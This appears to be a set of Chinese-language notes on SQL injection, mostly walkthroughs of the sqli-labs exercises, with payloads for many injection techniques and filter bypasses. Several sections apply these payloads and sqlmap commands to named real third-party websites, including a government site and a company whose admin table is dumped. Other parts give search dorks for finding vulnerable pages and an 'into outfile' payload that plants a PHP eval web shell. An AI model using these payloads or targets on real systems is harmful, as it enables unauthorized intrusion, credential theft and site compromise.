@@ -1,0 +1,933 @@
+sqlmap安装 git clone https://github.com/sqlmapproject/sqlmap.git
+
+乐洪舟 2018/7/23 10:52:39
+select email_id from security.emails union select group_concat(username,0x23,password) from security.users;
+http://10.251.232.230/sqli/Less-1/?id=1
+
+
+数字型
+select id, username,password from users where id = $id limit 0,1;
+id输入：3%23
+select id, username,password from users where id = 3%23 limit 0,1;
+
+试探方法：
+id输入：1'
+select id, username,password from users where id = 1' limit 0,1; 语法错误，报错
+id输入：1 and 1 =1%23
+select id, username,password from users where id = 1 and 1 =1%23 limit 0,1;语法正确，查得出记录
+id输入：1 and 1 =2%23
+select id, username,password from users where id = 1 and 1 =2%23 limit 0,1; 语法正确，但查不出记录
+
+
+单引号
+select id, username,password from users where id = '$id' limit 0,1;
+id输入：3'%23
+select id, username,password from users where id = '3'%23' limit 0,1;
+试探方法：
+id输入：1'
+select id, username,password from users where id = '1'' limit 0,1;  语法错误，报错
+id输入：1' and 1=1%23
+select id, username,password from users where id = '1' and 1=1%23' limit 0,1;语法正确，查得出记录
+id输入：1' and 1=2%23
+select id, username,password from users where id = '1' and 1=2%23' limit 0,1;语法正确，但查不出记录
+
+
+双引号
+select id, username,password from users where id = "$id" limit 0,1;
+id输入：3"%23
+select id, username,password from users where id = "3"%23" limit 0,1;
+
+括号
+select id, username,password from users where id in ($id);
+id输入：3)%23
+select id, username,password from users where id in (3)%23);
+id输入：1,2,3)%23
+select id, username,password from users where id in (1,2,3)%23);
+
+
+
+括号加单引号
+select id, username,password from users where id in ('$id');
+id输入：3')%23
+select id, username,password from users where id in ('3')%23');
+
+试探方法：
+id输入：1'
+select id, username,password from users where id in ('1''); 语法错误，报错
+id输入：1') and 1=1%23 
+select id, username,password from users where id in ('1') and 1=1%23'); 语法正确，查得出记录
+id输入：1') and 1=2%23
+select id, username,password from users where id in ('1') and 1=2%23'); 语法正确，但查不出记录
+
+
+括号加双引号
+select id, username,password from users where id in ("$id");
+id输入：3")%23
+select id, username,password from users where id in ("3")%23");
+试探方法：
+id输入：1'
+select id, username,password from users where id in ("1'"); 语法错误，报错
+id输入：1") and 1=1%23 
+select id, username,password from users where id in ("1") and 1=1%23"); 语法正确，查得出记录
+id输入：1") and 1=2%23 
+select id, username,password from users where id in ("1") and 1=2%23"); 语法正确，但查不出记录
+
+
+报错注入：
+爆数据库;
+id输入：1' and extractvalue(1, concat(0x5c,(select database()))) %23
+页面显示：
+XPATH syntax error: '\security'
+爆表：
+id输入：1' and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1))) %23
+XPATH syntax error: '\admin'
+爆字段：
+id输入：1' and extractvalue(1, concat(0x5c,(select COLUMN_NAME from Information_schema.columns where table_Name = 0x61646d696e and TABLE_SCHEMA= 0x7365637572697479 limit 1,1))) %23
+页面显示：
+XPATH syntax error: '\adminname'
+爆内容：
+id输入：1' and extractvalue(1, concat(0x5c,(select key_flag from `[adminname]`))) %23
+
+
+http://www.atrium.com.pk/Shopping.php?ID=1
+
+http://www.atrium.com.pk/admin/IPLock.php
+
+
+百度搜索：inurl:php?id=
+
+
+后台代码：
+SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1
+
+输入账号：Dumb 密码：Dumb2
+SELECT username, password FROM users WHERE username='Dumb' and password='Dumb2' LIMIT 0,1
+
+绕过登录：
+输入账号：aaa 密码：1' or 1=1#
+SELECT username, password FROM users WHERE username='aaa' and password='1' or 1=1#' LIMIT 0,1
+
+
+Sql注入1：盲注
+输入账号：Dumb 密码：Dumb' and length(database())=8#
+SELECT username, password FROM users WHERE username='Dumb' and password='Dumb' and length(database())=8#' LIMIT 0,1
+
+security
+
+输入账号：Dumb 密码：Dumb' and ascii(substr(database(),2,1))=115#
+SELECT username, password FROM users WHERE username='Dumb' and password='Dumb' and ascii(substr(database(),2,1))=115# LIMIT 0,1
+
+
+Sql注入2：报错
+输入账号：aaa 密码：aaa' and updatexml(1,concat(0x23,database()),1)#
+SELECT username, password FROM users WHERE username='aaa' and password='aaa' and updatexml(1,concat(0x23,database()),1)#' LIMIT 0,1
+
+输入账号：aaa 密码：aaa' and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1)#
+ 
+
+渗透网站
+http://www.eaonline.com.cn/cpzs/cpzs.php?id=1415
+
+求数据库长度
+http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and length(database())〉8%23  错误
+http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and length(database())=5%23  正确
+
+求数据库acsii码
+求数据库第一个字符 http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and ascii(substr(database(),1,1))=99%23  验证正确 说明第一个字符是 c
+求数据库第二个字符http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and ascii(substr(database(),2,1))=104%23  验证正确 说明第一个字符是 h
+....
+求得数据库名称为cheaa
+
+
+http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and database()='cheaa'%23 验证正确 说明数据库的名称是：cheaa
+
+
+求表的数量
+http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and (select count(table_name) from information_schema.tables where table_schema='security') = 4 %23  
+
+求第一张表的名字的第一个字符的acsii码
+http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101 %23
+求第一张表的名字的第二个字符的acsii码
+http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1))=101 %23
+求第二张表的名字的第一个字符的acsii码
+http://www.eaonline.com.cn/cpzs/cpzs.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=101 %23
+以此类推......
+
+
+
+--dump 转存数据
+-C参数指定字段名称
+-T指定表名【因为user属于数据库关键字，所以建议加上【】】
+-D指定数据库名称
+获取数据库名
+-u "http://10.251.232.230/sqli/Less-5/?id=1" --dbs
+获取当前数据库名
+-u "http://10.251.232.230/sqli/Less-5/?id=1" --current-db
+获取指定数据库所有表
+-u "http://10.251.232.230/sqli/Less-5/?id=1" --table -D "bbs"   (D是参数数据库）
+-u "http://10.251.232.230/sqli/Less-5/?id=1" --table -D "security"
+获取表的字段
+-u "http://10.251.232.230/sqli/Less-5/?id=1" --columns -T "User" -D "bbs"
+-u "http://10.251.232.230/sqli/Less-5/?id=1" --columns -T "admin" -D "security"
+获取指定字段的内容
+-u "http://10.251.232.230/sqli/Less-5/?id=1" --dump -C " " -T "[User]" -D "bbs"
+-u "http://10.251.232.230/sqli/Less-5/?id=1" --dump -C "adminname,adminpasswd" -T "admin" -D "security"
+
+实例操作
+获取数据库名
+-u "http://www.atrium.com.pk/Shopping.php?ID=1" --dbs
+-u "http://www.atrium.com.pk/Shopping.php?id=1" --table -D "db738736812"
+
+
+
+时间型盲注
+后台代码：
+select id, username,password from users where id = '$id' limit 0,1;
+
+输入id：1' and if(length(database())>10,sleep(0),sleep(5)) %23
+select id, username,password from users where id = '1' and if(length(database())>10,sleep(0),sleep(5)) %23' limit 0,1;
+等同：
+输入id：1' and sleep(if(length(database())>10,0,5)) %23
+实例，获取数据库名称长度
+http://10.251.232.230/sqli/Less-9/?id=1' and if(length(database())=8,sleep(0),sleep(5)) %23   立即返回，说明数据库名长度为8
+获取数据库名第一个字符
+id输入：1' and if(ascii)substr(database(),1,1))>99,sleep(0),sleep(5)) %23
+
+
+
+
+-u "http://103.238.227.13:10083/?id=1" --dbs
+http://103.238.227.13:10083/?id=1' and length(database())〉8%23
+
+
+
+宽字节注入
+在单引号之前输入%df
+http://10.251.232.230/sqli/Less-32/?id=
+id输入：1%df'%23
+
+id输入：1' and 1=1%23   应该正确
+id输入：1' and 1=2%23   应该错误
+
+id输入：1%df' and 1=1%23   应该正确
+id输入：1%df' and 1=2%23   应该错误
+
+
+id输入：1%df' order by 3%23  正确，说明有三列
+id输入：1%df' and 1=2 union select 1,2,3 %23
+id输入：1%df' and 1=2 union select 1,version(),3 %23
+
+爆出数据库第二张表名
+id输入：1%df'union select 1,2,schema_name from information_schema.schemata limit 1,1%23  
+1%df'and 1=2 union select username,password from security limit 0,1%23
+select email_id from security.emails union select group_concat(username,0x23,password) from security.users
+
+burp拦截
+后台代码：
+select username from users where username = '$uname' limit 0,1;
+
+uname输入：aaa' and 1=1%23
+select username from users where username = 'aaa' and 1=1%23' limit 0,1;  正确
+
+uname输入：aaa' and 1=2%23
+select username from users where username = 'aaa' and 1=2%23' limit 0,1;
+
+uname输入：aaa' order by 3%23
+uname输入：aaa' and 1=2 union select 1,2,3%23
+uname输入：aaa' and 1=2 union select 1,version(),3%23
+
+后台代码：
+$uagent = $_SERVER['HTTP_USER_AGENT'];
+$IP = $_SERVER['REMOTE_ADDR'];
+insert into security.uagents(uagent, ip_address, username) values ('$uagent', '$IP', '$uname');
+
+
+uagent后面添加：1' or updatexml(1,concat(0x7e,(database())),0) or '
+uagent变为：Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.01' or updatexml(1,concat(0x7e,(database())),0) or '
+
+盲注：
+查询当前用户：
+id输入：1')) and length(current_user())>10%23
+id输入：1')) and substr(current_user(),1) = 'root%40localhost'%23
+
+查询当前用户是否有文件读写权限：
+id输入：1')) and (select File_priv from mysql.user where user='root' and host='localhost')='Y'%23
+
+
+id输入：1')) order by 3%23
+id输入：1')) and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16'<?php @eval($_POST[a]);?>' into outfile 'D:/phpStudy/WWW/qq.php'%23 植入木马
+
+
+
+https://blog.csdn.net/microzone/article/details/52034161
+
+渗透测试攻防练习实验室 （资源分享，国外在线教程）
+
+
+
+实例
+http://www.lifetechpharm.com/lt/about/index.php?id=1
+-u "http://www.lifetechpharm.com/lt/about/index.php?id=1" --table -D "konzern"
+lt_admin
+-u "http://www.lifetechpharm.com/lt/about/index.php?id=1"  --columns -T "lt_admin" -D "konzern"
+
+Database: konzern
+[20 tables]
++-----------------+
+| lt_admin        |
+| lt_admin_list   |
+| lt_guanggao     |
+| lt_k_content    |
+| lt_link         |
+| lt_news         |
+| lt_news_type    |
+| lt_pro_type     |
+| lt_product      |
+| lt_user         |
+| lt_user_list    |
+| ltny_about      |
+| ltny_admin_list |
+| ltny_contact    |
+| ltny_index_pic  |
+| ltny_news       |
+| ltny_production |
+| ltny_type       |
+| ltny_users      |
+| ltny_yaohai     |
++-----------------+
+
+-u "http://www.lifetechpharm.com/lt/about/index.php?id=1" --dump -C "id,pwd,user" -T "lt_admin" -D "konzern"
+
+错误结果分析：
+Database: konzern
+Table: lt_admin
+[1 entry]
++----+-----+------+
+| id | pwd | user |
++----+-----+------+
+|    |     |      |
++----+-----+------+
+ [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.
+[16:36:01] [INFO] table 'konzern.lt_admin' dumped to CSV file 'C:\Users\L\Desktop\web??\SQLMAP~1\Bin\output\www.lifetechpharm.com\dump\konzern\lt_admin.csv'
+[16:36:01] [INFO] fetched data logged to text files under 'C:\Users\L\Desktop\web??\SQLMAP~1\Bin\output\www.lifetechpharm.com'
+
+inurl:"php?id=" + intext:"phpStudy\WWW"
+
+测试是否有导入导出权限：
+SELECT @@global.secure_file_priv;
+http://10.251.233.123/sqli/Less-7/id=1' union select 1,2,%40%40global.secure_file_priv%23
+http://www.china-minto.com/cn/new.php?id=2 and 1=2 union select 1,2,3,group_concat(user,0x23,File_priv,0x23,host),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from mysql.user where user='root' %23
+
+http://www.e-ande.com/about.php?id=8
+
+
+http://www.ccxm.gov.cn/zxzx_show.php?id=63
+
+
+练习
+https://blog.csdn.net/qq_21500173/article/details/51964908#less-23-error-based-no-comments
+https://blog.csdn.net/Fly_hps/article/details/80278825
+
+less-1
+http://127.0.0.1/sqli/Less-1/?id=1' 单引号闭合
+1' and 1=1%23
+1' and 1=2 union select 1,2,3%23
+
+
+less-2
+http://127.0.0.1/sqli/Less-2/?id=1  数字型闭合
+1 and 1=1%23
+1 and 1=2%23
+?id=1 order by 3%23  
+?id=1 and 1=2 select 1,2,3%23
+
+less-3
+http://127.0.0.1/sqli/Less-3/?id=1')  单引号加括号型闭合
+
+less-4
+http://127.0.0.1/sqli/Less-4/?id=1")  双引号加括号型闭合
+
+less-5
+http://127.0.0.1/sqli/Less-5/?id=1' 单引号闭合  不带显示位
+盲注
+1' order by 3%23
+1' and length(database())=8%23
+基于报错
+1' and updatexml(1,concat(0x23,database()),1)%23
+
+less-6
+http://127.0.0.1/sqli/Less-6/?id=1"  双引号闭合 盲注 同less-5
+
+less-7
+http://127.0.0.1/sqli/Less-7/?id=1')) and 1=1 %23   Use outfile
+1')) union select 1,'2','<?php @eval($_POST[a]);?>' into outfile 'D:/phpStudy/WWW/11.php'%23
+
+less-8
+http://127.0.0.1/sqli/Less-8/?id=1' and 1=2%23  盲注，不能使用报错
+
+less-9
+单引号闭合型时间型盲注：
+输入id：1' and if(length(database())>10,sleep(0),sleep(5))%23
+
+等同：
+求数据库长度
+输入id：1' and sleep(if(length(database())>10,0,5)) %23
+求数据库名称
+输入id： 1' and sleep(if(ascii(substr(database(),1,1))=115,0,5)) %23 
+求表的个数
+输入id： 1' and sleep(if(select count(table_name) from information_schema.tables where table_schema='security') = 4 ,0,5)) %23
+求表的长度
+输入id： 1' and sleep(if(length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=8,0,5))%23
+求表的名称：
+输入id： 1' and sleep(if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101),0,5) %23 
+输入id： 1' and sleep(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,0,5) %23 
+
+less-10
+双引号闭合型时间型盲注：
+输入id：1" and if(length(database())>10,sleep(0),sleep(5))%23
+
+less-11  单引号闭合
+sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"
+绕过登录：
+输入账号：aaa 密码：1' or 1=1#
+SELECT username, password FROM users WHERE username='aaa' and password='1' or 1=1#' LIMIT 0,1
+
+输入账号：aaa 密码：1' or '1'='1
+SELECT username, password FROM users WHERE username='aaa' and password='1' or '1'=1' LIMIT 0,1
+
+Sql注入1：盲注
+输入账号：Dumb 密码：Dumb' and length(database())=8#
+SELECT username, password FROM users WHERE username='Dumb' and password='Dumb' and length(database())=8#' LIMIT 0,1
+
+security
+
+输入账号：Dumb 密码：Dumb' and ascii(substr(database(),1,1))=115#
+SELECT username, password FROM users WHERE username='Dumb' and password='Dumb' and ascii(substr(database(),2,1))=115# LIMIT 0,1
+
+
+Sql注入2：报错
+输入账号：aaa 密码：aaa' and updatexml(1,concat(0x23,database()),1)#
+SELECT username, password FROM users WHERE username='aaa' and password='aaa' and updatexml(1,concat(0x23,database()),1)#' LIMIT 0,1
+
+输入账号：aaa 密码：aaa' and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1)#
+
+输入账号：aaa 密码：aaa' and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='admin')),1)#
+
+输入账号：aaa 密码：aaa' and updatexml(1,concat(0x23,(select group_concat(Id,0x23,adminname,0x23,adminpasswd)from security.admin)),1)#
+
+输入账号：aaa 密码：aaa' and updatexml(1,concat(0x23,(select group_concat(username,0x23,password)from security.users)),1)#
+
+less-12 
+sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"
+绕过登录：
+输入账号：admin")# 密码：aaa
+SELECT username, password FROM users WHERE username=("admin")#") and password=("aaa") LIMIT 0,1"
+输入账号：")  union select 1,database()#  密码：aaa
+SELECT username, password FROM users WHERE username=(aaa) and password=(1) or (1)=(1) LIMIT 0,1"
+
+less-13
+http://127.0.0.1/sqli/Less-13/?id=1
+sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"
+绕过登录：
+输入账号：aaa 密码：1') or 1=1#
+SELECT username, password FROM users WHERE username=('aaa') and password=('1') or 1=1#') LIMIT 0,1
+输入账号：aaa 密码：1') or ('1')=('1
+SELECT username, password FROM users WHERE username=('aaa') and password=('1') or ('1')=('1') LIMIT 0,1"
+
+输入账号：aaa 密码：aaa') and updatexml(1,concat(0x23,database()),1)#
+password=('aaa') and updatexml(1,concat(0x23,database()),1)#')
+XPATH syntax error: '#security'
+
+less-14
+sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"
+输入账号：aaa 密码：1" or 1=1#           
+SELECT username, password FROM users WHERE username="aaa" and password="1" or 1=1#" LIMIT 0,1
+输入账号：aaa 密码：1" or "1"="1
+SELECT username, password FROM users WHERE username=aaa and password="1" or "1"="1" LIMIT 0,1"
+输入账号：admin" and updatexml(1,concat(0x23,database()),1)# 密码：aaa  
+输入账号：aaa 密码：aaa" and updatexml(1,concat(0x23,database()),1)#
+
+less-15
+sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"
+输入账号：admin'and If(ascii(substr(database(),1,1))=115,1,sleep(5))# 密码：aaa 
+ 
+less-16     
+$uname='"'.$uname.'"';$passwd='"'.$passwd.'"'; 
+$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"
+布尔型注入    时间延迟
+username：admin") and left(version(),1)=5 #   password:aaa
+username：admin") and length(database())=8#   password:aaa
+
+less-17  数字型 带显示位
+尝试报错：
+username：admin password：aaa' and extractvalue(1,concat(0x7e,(select @@version),0x7e))#
+XPATH syntax error: '~5.5.47~'
+输入账号：aaa 密码：aaa' and updatexml(1,concat(0x23,database()),1)#
+输入账号：aaa 密码：aaa' or updatexml(1,concat(0x7e,database()),0) or '1
+
+less-18
+后台代码：
+$uagent = $_SERVER['HTTP_USER_AGENT'];
+$IP = $_SERVER['REMOTE_ADDR'];
+insert into security.uagents(uagent, ip_address, username) values ('$uagent', '$IP', '$uname');
+
+uagent后面添加：1' or updatexml(1,concat(0x7e,(database())),0) or '
+uagent变为：Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.01' or updatexml(1,concat(0x7e,(database())),0) or '
+XPATH syntax error: '~security'
+
+less-19
+$uagent = $_SERVER['HTTP_REFERER'];
+$IP = $_SERVER['REMOTE_ADDR'];
+insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')"
+
+headers或ROW中VALUES值 改为：1' or updatexml(1,concat(0x7e,(database())),0) or '
+
+less-20  cookie注入
+sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"
+uname输入：aaa' order by 3%23
+uname输入：aaa' and 1=2 union select 1,2,3%23
+uname输入：aaa' and 1=2 union select 1,version(),3%23
+uname输入：aaa' and 1=2 union select 1,database(),3%23
+uname输入：aaa' and 1=2 and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1)%23
+Issue with your mysql: XPATH syntax error: '#admin,emails,referers,uagents,u'
+
+uname输入：aaa' and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),1)%23
+
+Issue with your mysql: XPATH syntax error: '#Id,adminname,adminpasswd'
+
+uname输入:aaa' and updatexml(1,concat(0x23,(select group_concat(username,0x23,password)from security.users)),1)%23
+Issue with your mysql: XPATH syntax error: '#Dumb#Dumb,Angelina#I-kill-you,D'
+
+
+第21题：
+$cookee = $_COOKIE['uname'];
+$cookee = base64_decode($cookee);
+SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1
+与20题基本相似，不同的是，闭合条件为单引号加括号，cookie中uname编码为base64
+uname=aaa') order by 3#   ->    uname=YWEnKSBvcmRlciBieSAzIw==
+uname=aaa') and 1=2 union select 1,2,3#   ->    uname=YWFhJykgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLDMj
+uname=') and 1=2 union select 1,2,database()#   ->    uname=JykgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj
+显示位
+
+第22题：
+$cookee = $_COOKIE['uname'];
+$cookee = base64_decode($cookee);
+$cookee1 = '"'. $cookee. '"';
+SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1;
+与21题基本相似，不同的是，闭合条件为双引号
+uname=aaa" and 1=2 union select 1,2,database()#
+显示位
+
+第23题：
+$reg = "/#/";
+$reg1 = "/--/";
+$replace = "";
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id);
+SELECT * FROM users WHERE id='$id' LIMIT 0,1;
+
+http://127.0.0.1/sqli/Less-23/?id=-1' union select 1,database(),'3
+单引号，显示位
+
+第24题：
+用户注册login_create.php
+$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";、
+username输入：admin'#
+password随意
+
+用户登录login.php
+$username = mysql_real_escape_string($_POST["login_user"]);
+$password = mysql_real_escape_string($_POST["login_password"]);
+$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
+
+密码修改pass_change.php
+$username= $_SESSION["username"];
+$curr_pass= mysql_real_escape_string($_POST['current_password']);
+$pass= mysql_real_escape_string($_POST['password']);
+$re_pass= mysql_real_escape_string($_POST['re_password']);
+$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
+二次排序注入
+
+
+第25题
+function blacklist($id)
+{
+	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
+	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
+	
+	return $id;
+}
+多重关键字：
+id输入：1' anandd 1=1%23
+id输入：1' anandd 1=2%23
+id输入：1' anandd 1=2 union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata%23
+
+
+第25a题
+同25题，不同的是id为数字型
+id输入：1 anandd 1=1%23
+id输入：1 anandd 1=2%23
+id输入：1 anandd 1=2 union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata%23
+
+
+第26题
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+基于联合查询，多重关键字：
+id输入1' and 1=2 union select 1,2,'3
+id输入1'%0banandd%0b1=2%0bunion%0bselect%0b1,2,'3
+SELECT * FROM users WHERE id='1' and 1=2 union select 1,2,'3' LIMIT 0,1
+基于报错
+1'||updatexml(1,concat(0x23,(select%0bgroup_concat(table_name)%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema='security')),1)||'1
+
+第26a题
+同26题，不同的是闭合字符是单引号加括号
+SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+id输入1')%0banandd%0b1=2%0bunion%0bselect%0b1,2,('3
+
+第27题
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+$id= preg_replace('/[--]/',"", $id);		//Strip out --.
+$id= preg_replace('/[#]/',"", $id);			//Strip out #.
+$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+$id= preg_replace('/union/s',"", $id);	    //Strip out union
+$id= preg_replace('/select/s',"", $id);	    //Strip out select
+$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
+$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
+$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
+$id= preg_replace('/Select/s',"", $id);	    //Strip out select
+return $id;
+}
+
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+
+%0b替代空格
+unIon替代union
+SelEcT替代select
+id不能输入-1，因为输入-1的话前面的减号会被替换
+id输入1000'%0bunIon%0bSelEcT%0b1,2,'3
+id输入1000'%0bunIon%0bSelEcT%0b1,group_concat(table_name),3%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema='security
+
+
+第27a题
+同27题，不同的是闭合字符为双引号
+id输入1000"%0bunIon%0bSelEcT%0b1,2,"3
+id输入1000"%0bunIon%0bSelEcT%0b1,group_concat(table_name),3%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema="security
+
+
+第28题
+SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+id输入1000')%0bunion%0bselect%0b1,2,('3
+id输入1000')%0bunion%0bselect%0b1,group_concat(table_name),3%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=('security
+
+
+第28a题
+$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out spaces.
+SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+
+id输入1') and 1=2 union%0bselect 1,2,3%23
+id输入1') and 1=2 union%0bselect 1,group_concat(table_name),3 from information_schema.tables where table_schema=('security')%23
+
+
+第29题
+id=1' and 1=2%23
+id=1' and 1=2 union select 1,2,3%23
+
+第30题
+id=1" and 1=2%23
+id=1" and 1=2 union select 1,2,3%23
+
+第31题
+id=1") and 1=2%23
+id=1") and 1=2 union select 1,2,3%23
+
+第32题
+function check_addslashes($string)
+{
+    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
+    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
+    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
+    return $string;
+}
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+宽字节注入
+id输入1%df' and 1=2 union select 1,2,3%23
+id输入1%df' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479%23
+
+第33题
+function check_addslashes($string)
+{
+    $string= addslashes($string);    
+    return $string;
+}
+方法与32题基本相同
+
+第34题
+$uname = addslashes($uname1);
+$passwd= addslashes($passwd1);
+SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1；
+username输入：admin
+password输入：1
+用burp拦截后password改为1%df' and updatexml(1,concat(0x7e,(database())),0)#
+
+
+第35题
+id输入1 and 1=2 union select 1,2,3%23
+id输入1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479%23
+
+第36题
+D:\phpStudy\MySQL\my.ini文件中的gbk改为latin1
+id=1%df' and 1=2%23
+id=1%df' and 1=2 union select 1,2,3%23
+id=1%df' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479%23
+
+第37题
+$uname1=$_POST['uname'];
+$passwd1=$_POST['passwd'];
+$uname = mysql_real_escape_string($uname1);
+$passwd= mysql_real_escape_string($passwd1);
+SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1
+burp拦截
+username输入：admin
+password输入：admin%df' and updatexml(1,concat(0x7e,(database())),0)#
+username输入：admin
+password输入：admin%df' and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)),1)#
+
+
+第38题
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+if (mysqli_multi_query($con1, $sql))
+{
+    if ($result = mysqli_store_result($con1))
+    {
+        if($row = mysqli_fetch_row($result))
+多个查询
+基于联合查询的注入
+id=1' and 1=2 union select 1,2,3%23
+id=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'%23
+堆叠注入
+id=1';insert into users(username,password) values('less38,'less38')%23
+
+第39题
+同38题，只是id为数字型
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+多个查询
+基于联合查询的注入
+id=1 and 1=2 union select 1,2,3%23
+id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'%23
+堆叠注入
+id=1;insert into users(username,password) values('less39','less39')%23
+
+
+第40题
+同38题，只是闭合条件为单引号加括号
+$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+多个查询
+基于联合查询的注入
+id=1') and 1=2 union select 1,2,3%23
+id=1') and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'%23
+堆叠注入
+id=1');insert into users(username,password) values('less40','less40')%23
+
+
+less-41   Stacked injections:堆叠注入
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"
+id输入：id=0 union select 1,version(),3%23
+id输入：1;insert into users(username,password) values('h','111')%23
+
+less-42  burp 改password-delete:25
+sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
+$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
+$password = $_POST["login_password"];
+uname=aaa   passwd=-1%df' union select 1,version(),3#
+
+less-43  burp 改password-delete:25
+$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
+$password = $_POST["login_password"];
+sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
+uname=aaa   passwd=-1%df') union select version(),3#
+password:12345');insert into users(username,password) values('hello','111')#
+
+less-44 同42
+$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
+$password = $_POST["login_password"]
+sql = "SELECT * FROM users WHERE username='$username' and password='$password'"
+uname=aaa   passwd=-1%df' union select 1,version(),3#
+uname=aaa   passwd=-1%df' union select 1,group_concat(schema_name),3 from information_schema.schemata# 
+
+less-45 同43
+$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
+$password = $_POST["login_password"]
+sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')"
+password:1');insert into users(username,password) values('hello','hello')#
+
+less-46  时间型盲注 报错
+http://127.0.0.1/sqli/Less-46/index.php?sort=1
+$sql = "SELECT * FROM users ORDER BY $id"
+print_r(mysql_error());
+:可以通过asc 和desc查看返回数据是否相同来简单判断是否存在orderby注入
+        sort=1 and (length(database())) =8 and if(1=1, sleep(5), null)
+        sort=1 and (ascii(substr((select database()) ,1,1))) = 115 and if(1=1, sleep(1), null)
